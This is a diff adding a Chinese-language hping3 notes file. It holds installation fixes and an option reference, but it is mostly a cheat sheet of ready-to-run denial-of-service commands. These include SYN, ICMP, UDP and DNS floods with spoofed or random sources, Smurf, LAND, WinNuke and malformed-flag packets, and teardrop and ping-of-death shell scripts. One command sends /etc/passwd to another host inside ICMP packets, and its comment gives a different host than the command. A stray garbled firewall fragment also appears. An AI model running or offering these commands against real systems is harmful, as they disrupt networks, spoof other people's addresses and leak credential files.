@@ -1,0 +1,376 @@
+hping命令的使用
+1.hping 192.168.123.1 -p 80 -S --flood
+--flood 尽可能快的发送，慎用
+
+2.hping 192.168.2.224 -p 80 -S
+-S 发送TCP的SYN包
+
+3.hping 192.168.2.224 -p 80 -A
+-A 发送TCP的ACK包
+
+4.hping3 -c 10000000000000 -i u1 -S -p 80 192.168.123.1
+-c表示发送数据包的个数  -i指定时间 u1表示1微妙
+-p表示端口   
+
+5.hping 172.16.105.92 -p 80 -S -a 152.123.12.1 --flood
+伪装ip并发到洪水攻击
+
+6.hping3 -I enp2s0 -S 192.168.123.1 -p 80
+检测一下目标主机的80端口是否开放
+
+7.
+(1)hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
+伪造ip并发动攻击，使用的网口是eth0
+
+(2)hping3 172.16.105.96 -c 10000000000000000000 -i u1 -S -p 80 --rand-source
+伪造成随机源ip
+
+8.hping3 192.168.123.1 --icmp -d 100 --sign signature --file /etc/passwd
+将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节(-d 100)，发送签名为signature(-sign signature)。
+
+
+9.hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 
+将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接
+
+10. sudo hping3 192.168.0.2 -S -p 80 -f
+-f 就是将包切割成多个片段
+
+11.hping3 -S -p 80 -i u5 172.16.8.167
+每5us发送一次网络帧
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+安装
+方式一
+先查检环境
+
+#rpm -qa | grep gcc
+#rpm -qa | grep libpcap
+#rpm -qa | grep tcl
+
+系统里没有安装 那么安装
+yum -y install libpcap
+yum -y install libpcap-devel
+yum -y install tcl-devel
+
+yum -y install hping3
+
+方式二
+源码编译安装
+
+wget http://www.hping.org/hping3-20051105.tar.gz
+
+编译bug：
+
+1.  libpcap_stuff.c:20:21: error: net/bpf.h: No such file or directory
+
+Actually, I had to make a /usr/local/include/net directory 
+then do the link
+ln -sf /usr/include/pcap-bpf.h /usr/local/include/net/bpf.h
+
+2.
+In file included from ars.h:20,
+                 from arsglue.c:7:
+bytesex.h:22:3: error: #error can not find the byte order for this architecture, fix bytesex.h
+In file included from arsglue.c:7:
+ars.h:190:2: error: #error "Please, edit Makefile and add -DBYTE_ORDER_(BIG|LITTLE)_ENDIAN"
+ars.h:254:2: error: #error "Please, edit Makefile and add -DBYTE_ORDER_(BIG|LITTLE)_ENDIAN"
+ars.h:323:2: error: #error "Please, edit Makefile and add -DBYTE_ORDER_(BIG|LITTLE)_ENDIAN"
+make: *** [arsglue.o] Error 1
+
+
+解答：
+[root@localhost hping3-20051105]# vi bytesex.h
+/* Original code from the Linux C library */
+/* Copyright (C) 2000,2001 Salvatore Sanfilippo <antirez@invece.org>
+ * This code is under the original GNU C library license (GPL) */
+/* $Id: bytesex.h,v 1.1.1.1 2003/08/31 17:23:48 antirez Exp $ */
+#ifndef ARS_BYTESEX_H
+#define ARS_BYTESEX_H
+#if     defined(__i386__) \
+	|| defined(__x86_64__) \ #增加这一行
+        || defined(__alpha__) \
+        || (defined(__mips__) && (defined(MIPSEL) || defined (__MIPSEL__)))
+#define BYTE_ORDER_LITTLE_ENDIAN
+#elif   defined(__mc68000__) \
+        || defined (__sparc__) \
+        || defined (__sparc) \
+        || defined (__PPC__) \
+        || defined (__BIG_ENDIAN__) \
+        || (defined(__mips__) && (defined(MIPSEB) || defined (__MIPSEB__)))
+#define BYTE_ORDER_BIG_ENDIAN
+#else
+# error can not find the byte order for this architecture, fix bytesex.h
+#endif
+#endif /* ARS_BYTESEX_H */
+
+3.
+[root@localhost hping3-20051105]# make install
+cp -f hping3 /usr/sbin/
+chmod 755 /usr/sbin/hping3
+ln -s /usr/sbin/hping3 /usr/sbin/hping
+ln -s /usr/sbin/hping3 /usr/sbin/hping2
+@@@@@@ WARNING @@@@@@
+Can't install the man page: /usr/local/man/man8 does not exist
+[root@localhost hping3-20051105]# man hping
+No manual entry for hping
+
+办法：
+./configure --prefix=/usr --mandir=man
+Then make & make install again
+上面一步没有报错，只有warning，说man page没有装上，这个不影响hping的功能
+
+
+
+
+使用
+
+Mode
+default mode TCP
+-0 --rawip RAW IP mode
+-1 --icmp ICMP mode
+-2 --udp UDP mode
+-8 --scan SCAN mode.
+Example: hping --scan 1-30,70-90 -S www.target.host
+-9 --listen listen mode
+
+速度和数量控制
+-c --count packet count
+-i --interval wait (uX for X microseconds, for example -i u1000)
+--fast alias for -i u10000 (10 packets for second)
+--faster alias for -i u1000 (100 packets for second)
+--flood sent packets as fast as possible. Don't show replies.
+
+
+IP
+-a --spoof spoof source address
+--rand-dest random destionation address mode. see the man.
+--rand-source random source address mode. see the man.
+-t --ttl ttl (default 64)
+-N --id id (default random)
+-W --winid use win* id byte ordering
+-r --rel relativize id field (to estimate host traffic)
+-f --frag split packets in more frag. (may pass weak acl)
+-x --morefrag set more fragments flag
+-y --dontfrag set dont fragment flag
+-g --fragoff set the fragment offset
+-m --mtu set virtual mtu, implies --frag if packet size > mtu
+-o --tos type of service (default 0x00), try --tos help
+-G --rroute includes RECORD_ROUTE option and display the route buffer
+--lsrr loose source routing and record route
+--ssrr strict source routing and record route
+-H --ipproto set the IP protocol field, only in RAW IP mode
+
+ICMP
+-C --icmptype icmp type (default echo request)
+-K --icmpcode icmp code (default 0)
+--force-icmp send all icmp types (default send only supported types)
+--icmp-gw set gateway address for ICMP redirect (default 0.0.0.0)
+--icmp-ts Alias for --icmp --icmptype 13 (ICMP timestamp)
+--icmp-addr Alias for --icmp --icmptype 17 (ICMP address subnet mask)
+--icmp-help display help for others icmp options
+
+UDP/TCP
+-s --baseport base source port (default random) 源端口默认是随机的
+-p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec 目的端口默认是0
+-k --keep keep still source port
+-w --win winsize (default 64)
+-O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4)
+-Q --seqnum shows only tcp sequence number
+-b --badcksum (try to) send packets with a bad IP checksum many systems will fix the IP checksum sending the packet so you'll get bad UDP/TCP checksum instead.
+-M --setseq set TCP sequence number
+-L --setack set TCP ack
+-F --fin set FIN flag
+-S --syn set SYN flag
+-R --rst set RST flag
+-P --push set PUSH flag
+-A --ack set ACK flag
+-U --urg set URG flag
+-X --xmas set X unused flag (0x40)
+-Y --ymas set Y unused flag (0x80)
+--tcpexitcode use last tcp->th_flags as exit code
+--tcp-timestamp enable the TCP timestamp option to guess the HZ/uptime
+
+Common
+-d --data data size (default is 0)
+-E --file data from file
+-e --sign add 'signature'
+-j --dump dump packets in hex
+-J --print dump printable characters
+-B --safe enable 'safe' protocol
+-u --end tell you when --file reached EOF and prevent rewind
+-T --traceroute traceroute mode (implies --bind and --ttl 1)
+--tr-stop Exit when receive the first not ICMP in traceroute mode
+--tr-keep-ttl Keep the source TTL fixed, useful to monitor just one hop
+--tr-no-rtt Don't calculate/show RTT information in traceroute mode
+
+######################################################################
+五元组
+
+-a --spoof spoof source address
+--rand-dest random destionation address mode. see the man.
+--rand-source random source address mode. see the man.
+
+-s --baseport base source port (default random) 源端口默认是随机的
+-p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec 目的端口默认是0
+
+default mode TCP
+-0 --rawip RAW IP mode
+-1 --icmp ICMP mode
+-2 --udp UDP mode
+
+######################################################################get
+syn flood
+
+hping -S -p 21 192.168.3.254 --flood --rand-source
+hping -S -p 21 被攻击主机ip --rand-source
+hping -S -p 21 被攻击主机ip -a 伪造的ip
+hping -S -p 21 被攻击主机ip #不填默认就是攻击机的ip
+攻击机向被攻击机一个没有打开的端口发送syn，被攻击机会回复一个rst+ack
+
+不填协议，默认就是tcp
+源地址
+不填源端口，默认就是随机的，如果命令行里面是发送1000个包，那么这1000个包的sport都是不要一样的，随机的
+目的地址 这就是要被攻击的主机ip
+目的端口，21
+
+######################################################################get
+icmp flood
+hping3 192.168.3.254 --icmp --flood  --rand-source #发出去的攻击包dip是随机的
+hping3 172.16.3.97 -1 -i u100000  -a 8.8.8.8   #伪造发出去的攻击包dip
+hping3 172.16.3.97 -1 -i u100000  
+
+--fast alias for -i u10000 (10 packets for second)
+--faster alias for -i u1000 (100 packets for second)
+--flood sent packets as fast as possible. Don't show replies.
+hping3 172.16.3.97 -1 --fast  --rand-source
+
+
+hping3 -rand-source 172.16.3.97 -flood -S -L 0 -p 80
+
+######################################################################get
+udp flood
+
+hping 172.16.3.254  -i u1000  -2 -a spoof_ip
+hping 192.168.3.254  --flood  -2 --rand-source
+
+100packet/s的速率发送udp包 dip=172.16.3.254  sip=运行hping所在的机器的ip，sport=随机  dport=0
+hping 172.16.3.254  -i u1000  -2
+
+用源IP 10.10.10.111向10.10.10.10以100packet/s的速率发送udp包
+hping 10.10.10.10 -i u10000 -2 -a 10.10.10.111
+
+
+这是相同的概念ICMP泛洪除非你发送大量的UDP数据。 UDP泛洪对网络带宽非常危险的。
+Generating UDP flood:
+hping3 -q -n -a 10.0.0.1 --udp -s 53 --keep -p 68 --flood 192.168.0.2
+
+对于UDP，你必须精确的知道源和目的端口，这里我选择了DNS和BOOTPC（的dhclient）端口。该BOOTPC（68）端口经常在个人电脑开着，因为大多数人使用DHCP来自己连接到网络。
+ame blacklist_180 --set -m comment --comment"Blacklist source IP" -j DROP
+
+######################################################################get
+dns flood
+
+hping 172.16.3.254  -i u1000 -p 53  -2
+hping 172.16.3.254  -i u1000 -p 53  -2 -a spoof_ip
+hping 172.16.3.254  -i u1000 -p 53  -2 --rand-source
+
+hping 192.168.3.254  --flood -p 53  -2 --rand-source
+
+######################################################################???
+teardrop
+
+#!/bin/bash
+dst=10.10.10.10
+for((i=100;i<150;i++))
+do
+hping $dst -1 -x -d 1000 -N $i -c 1
+hping $dst -1 -d 200 -g 400 -N $i -c 1
+done
+
+-x --morefrag set more fragments flag
+-d --data data size (default is 0)
+-N --id id (default random)
+-c --count packet count
+-g --fragoff set the fragment offset
+
+
+######################################################################get
+SMURF攻击
+hping3 -1 --flood -a 192.168.3.254 192.168.3.255
+hping -1 -a 192.168.1.5 192.168.1.255
+hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS
+
+
+######################################################################??
+XMAS TREE攻击
+hping2 -SFRP 192.168.1.5
+
+######################################################################get 
+WinNuke
+
+hping3 192.168.3.254 -U -p 139 --flood
+
+######################################################################get
+LAND攻击
+
+hping3 -k -S -s 25 -p 25 -a 192.168.3.254 192.168.3.254
+
+k --keep keep still source port
+-S --syn set SYN flag
+-s --baseport base source port (default random) 源端口默认是随机的
+
+hping3 -k -S -s 25 -p 25 -a 192.168.1.5 192.168.1.5
+hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
+
+######################################################################get
+DEFORMITY攻击
+
+hping3  -FSRPAU -p 21 192.168.21.3 -i u1000
+
+-F --fin set FIN flag
+-S --syn set SYN flag
+-R --rst set RST flag
+-P --push set PUSH flag
+-A --ack set ACK flag
+-U --urg set URG flag
+
+######################################################################get
+SWEEP扫描攻击
+hping3 192.168.21.3 -1 -a 10.10.10.10 -i u1000 
+
+######################################################################get
+
+超大icmp报文
+man ping
+       -s packetsize 指定icmp的playload
+              Specifies the number of data bytes to be sent.  The default is 56, which translates into 64 ICMP data bytes when
+              combined with the 8 bytes of ICMP header data.
+
+[root@localhost log]# ping 192.168.3.254 -s 655350
+WARNING: probably, rcvbuf is not enough to hold preload.
+Error: packet size 655350 is too large. Maximum is 65507
+			  
+
+发送一个大于65535字节的分片icmp包
+hping 10.10.10.10 --icmp -g 65420 -d 1200 -c 1
+-g 选项指定分片偏移，等同于--fragoff
+
+模拟ping of death
+pingofdeath.sh脚本
+
+#!/bin/bash
+#dst=10.10.10.10
+dst=$1
+id=186
+#14B ethernet header + 20B ip header + 8B icmp header
+dsize=1450
+let icmpsize=$dsize+8
+hping $dst -1 -x -d $dsize -N $id -c 1
+
+for i in $(seq 50)
+do
+    let offset=$i*$icmpsize
+    hping $dst -1 -x -d $dsize -g $offset -N $id -c 1
+done
+-N 选项指定IP报头的标识符，等同于--id -d 选项指定数据包的大小，等同于--data
+-x 选项说明该IP包后面还分片，相当于IP报头的M标识位，等同于--morefrag
